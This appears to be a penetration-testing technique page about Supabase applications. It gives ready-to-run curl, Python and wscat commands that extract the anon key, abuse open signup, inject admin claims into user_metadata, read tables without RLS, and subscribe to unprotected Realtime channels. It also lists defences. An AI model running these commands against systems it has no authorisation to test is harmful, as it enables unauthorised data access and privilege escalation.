---
title: "Supabase Security Testing"
type: technique
tags: [jwt, open-registration, privilege-escalation, rls, supabase, web, websocket]
phase: exploitation
date_created: 2026-05-21
date_updated: 2026-07-02
sources: []
---

# Supabase Security Testing

## What it is

Supabase is an open-source Backend-as-a-Service (BaaS) built on PostgreSQL, providing auth, real-time WebSocket subscriptions, and a REST API (PostgREST). Applications using Supabase embed a public "anon key" (a pre-signed JWT) in their JavaScript bundle, which any user can extract. Misconfiguration at the auth, RLS (Row Level Security), or metadata layer can turn this key into full database read access or privilege escalation.

## How it works

Every Supabase project has an anon key that grants access to the PostgREST API and Auth service. The key is intentionally public, but its effective permissions depend entirely on PostgreSQL RLS policies and Auth configuration. If either is absent or misconfigured, the anon key enables unauthenticated data access, open account creation, or self-issued elevated JWTs.

## Attack phases

Recon and exploitation: anon key extraction is recon; open signup, metadata injection, and RLS bypass are exploitation.

## Prerequisites

- A web application using Supabase (managed `*.supabase.co` or self-hosted)
- The anon key extracted from the application's JavaScript bundle

## Methodology

### 1. Extract the anon key

```bash
# Download the main JS bundle and grep for JWT-shaped strings
curl -sk "https://target.com/assets/index.js" | grep -oP 'eyJhbGci[A-Za-z0-9._-]+' | sort -u

# Decode the payload of each candidate
for token in $(curl -sk "https://target.com/assets/index.js" | grep -oP 'eyJhbGci[A-Za-z0-9._-]+' | sort -u); do
    echo "$token" | cut -d. -f2 | python3 -c "
import sys, base64, json
raw = sys.stdin.read().strip()
raw += '=' * (-len(raw) % 4)
try:
    d = json.loads(base64.urlsafe_b64decode(raw))
    if d.get('role') == 'anon':
        print('ANON KEY:', '$token')
        print(json.dumps(d, indent=2))
except: pass
"
done
```

The anon key payload contains `{"iss":"supabase","ref":"<project-id>","role":"anon","exp":...}`. The `ref` field is the project ID, giving you the Supabase API base URL: `https://<ref>.supabase.co`.

Note the `exp` field. Supabase anon keys are often issued with multi-year expiry (2033-2035 ranges are common) and have no built-in rotation mechanism.

### 2. Instance recon via settings endpoint

```bash
ANON_KEY="eyJ..."
SUPABASE_URL="https://<ref>.supabase.co"

curl -s "$SUPABASE_URL/auth/v1/settings" -H "apikey: $ANON_KEY" | python3 -m json.tool
```

Key fields to check:

| Field | Vulnerable value | Meaning |
|-------|-----------------|---------|
| `disable_signup` | `false` | Open registration; anyone can create an account |
| `mailer_autoconfirm` | `true` | No email verification required; account is immediately usable |
| `external.google` / `.github` | `true` | OAuth providers enabled; can use a throwaway OAuth account |

### 3. Open registration exploitation

If `disable_signup: false`:

```bash
# Create an account
curl -s -X POST "$SUPABASE_URL/auth/v1/signup" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@attacker.com","password":"TestPass123!"}'

# If mailer_autoconfirm is false, check your email for the confirmation link
# After confirming, log in:
JWT=$(curl -s -X POST "$SUPABASE_URL/auth/v1/token?grant_type=password" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@attacker.com","password":"TestPass123!"}' | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
echo "JWT: $JWT"
```

### 4. `user_metadata` privilege escalation

Supabase has two metadata stores per user:

| Store | Who can write | Included in JWT | Used for |
|-------|--------------|-----------------|---------|
| `user_metadata` | The user themselves via `PUT /auth/v1/user` | Yes | Application-layer UI checks |
| `app_metadata` | Server/admin only (service role key required) | Yes | RLS and server-side checks |

If the application gates features or roles on `user_metadata` fields, any authenticated user can escalate:

```bash
# Inject arbitrary claims into your own user_metadata
curl -s -X PUT "$SUPABASE_URL/auth/v1/user" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"data":{"role":"admin","is_admin":true,"plan":"enterprise"}}'

# Re-login to receive a new JWT carrying the injected claims
NEW_JWT=$(curl -s -X POST "$SUPABASE_URL/auth/v1/token?grant_type=password" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@attacker.com","password":"TestPass123!"}' | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Decode payload to confirm escalated claims
echo "$NEW_JWT" | cut -d. -f2 | python3 -c "
import sys, base64, json
raw = sys.stdin.read().strip()
raw += '=' * (-len(raw) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(raw))['user_metadata'], indent=2))
"
```

**Impact:** Any frontend authorization check reading `user_metadata.role`, `user_metadata.is_admin`, or similar is bypassed. Check the source (see [[javascript-source-map-exploitation]]) for all `user_metadata` references to understand what access the escalated JWT grants.

**Note on scope:** This escalation bypasses application-layer checks only. Database-level RLS that references `auth.jwt()->'app_metadata'` is unaffected because `app_metadata` cannot be self-modified.

### 5. RLS bypass: unauthenticated table access

Every Supabase project exposes a PostgREST endpoint at `/rest/v1/<table>`. If a table has no RLS policy, or if the policy grants anon reads, the data is accessible with only the anon key:

```bash
# List tables (introspection -- may be blocked)
curl -s "$SUPABASE_URL/rest/v1/" -H "apikey: $ANON_KEY"

# Read a specific table with anon key (no account needed)
curl -s "$SUPABASE_URL/rest/v1/messages?select=*&limit=10" \
  -H "apikey: $ANON_KEY" \
  -H "Accept: application/json"

# Use authenticated JWT for tables that require a logged-in user
curl -s "$SUPABASE_URL/rest/v1/orders?select=*&limit=10" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $JWT" \
  -H "Accept: application/json"

# Pagination -- iterate all rows
curl -s "$SUPABASE_URL/rest/v1/messages?select=*&offset=0&limit=1000" \
  -H "apikey: $ANON_KEY" -H "Prefer: count=exact"
# Response includes: Content-Range: 0-999/88771  (total row count in header)
```

Test all table names you find in extracted source maps. Try both anon key alone and with an authenticated JWT.

### 6. Unauthenticated Realtime WebSocket

Supabase Realtime allows subscribing to database change events via WebSocket. If channels are not protected:

```bash
# Install: npm install -g wscat
wscat -c "wss://<ref>.supabase.co/realtime/v1/websocket?apikey=$ANON_KEY&vsn=1.0.0"

# After connection, subscribe to all changes on a table
# Send (Phoenix protocol):
{"topic":"realtime:public:messages","event":"phx_join","payload":{"config":{"broadcast":{"self":true},"presence":{"key":""},"postgres_changes":[{"event":"*","schema":"public","table":"messages"}]}},"ref":"1"}
```

If the server responds with `phx_reply` and status `ok`, unauthenticated subscription succeeded and all INSERT/UPDATE/DELETE events on that table will stream to you.

### 7. Adjacent information leaks

Supabase-using applications frequently bundle additional third-party keys alongside the Supabase config:

```bash
# Sentry DSN (error monitoring -- gives stack traces, server paths, session data)
grep -oP 'https://[a-f0-9]+@[a-z0-9.]+/sentry\.io/[0-9]+' bundle.js

# Hotjar site ID (analytics -- read-only, low impact)
grep -oP '"hjid":\s*[0-9]+' bundle.js

# Git SHA (exact commit fingerprint -- correlate with GitHub for source leak)
grep -oP '[0-9a-f]{40}' bundle.js | head -5
```

A Sentry DSN gives read access to the project's error log, which often contains stack traces with internal file paths, API responses including auth tokens, and server-side environment details.

## Bypasses and variants

- **Signup disabled but OAuth enabled**: if `external.google: true`, create a throwaway Google/GitHub account and use the OAuth flow to get an authenticated session without triggering the `disable_signup` check
- **Self-hosted Supabase**: the anon key structure and endpoints are identical; the base URL will be the custom domain rather than `*.supabase.co`
- **Service role key**: if exposed (rarer; usually server-side only), grants full database access including writing `app_metadata` and bypassing all RLS

## Detection and defence

- Set `disable_signup: true` unless public registration is intentional
- Use `app_metadata` (not `user_metadata`) for all server-side authorization decisions
- Enable RLS on every table; test with anon key that each table returns zero rows or a permission error
- Do not embed the service role key anywhere in client-side code
- Rotate the anon key if it has been observed in security testing; the key cannot be revoked without redeploying the application

## Tools

- `curl`, Python (stdlib): auth endpoint interaction and JWT decoding
- `wscat`: WebSocket subscription testing
- [[burp-suite]]: intercepting anon key from bundle network requests

## Sources

- Generalised from real engagement findings
